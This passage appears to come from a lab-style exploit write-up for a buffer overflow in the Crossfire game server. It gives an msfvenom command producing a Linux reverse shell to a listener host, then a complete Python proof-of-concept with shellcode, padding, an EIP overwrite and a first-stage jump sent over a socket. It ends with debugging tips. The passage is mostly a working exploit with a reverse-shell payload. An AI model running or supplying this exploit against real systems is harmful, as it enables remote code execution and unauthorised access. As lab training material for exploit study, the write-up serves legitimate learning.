All that's left is to drop our payload at the beginning of our A's buffer. 

we will generate a reverse shell via msfvenom.

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b
"\x00\x20" -f py -v shellcode`

The payload will be placed near the beginning of our buffer, this means we need ot take payload size into account and pad with the correct amount of "A" chars. 

This maintains the original offset needed to overwrite EIP with our desired byttes. 

Final PoC with adjusted buffer:

```
#!/usr/bin/python
import socket
host = "10.11.0.128"
nop_sled = "\x90" * 8 # NOP sled
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f
py
shellcode = ""
shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"
shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"
shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"
shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"
shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"
shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"
shellcode += "\x7f\x6d\x02\x36"
padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip = "\x96\x45\x13\x08" # 0x08134596
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage +
"\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"
```

Restart the Crossfire app, start a NC listener, attch EDB and launch exploit!

Uh oh.. shell appears stuck. Going back to debugger, we see there is a message and app is paused. Hit OK, and we can issue commands via NC. However.. it pauses after each command?

This is due to the fact that the dbugger i s catching SIGCHLD events generated when something happens to our spawned child processs from reverse shell. 

To fix.. simply restart Crossfire and run without the debugger attached. 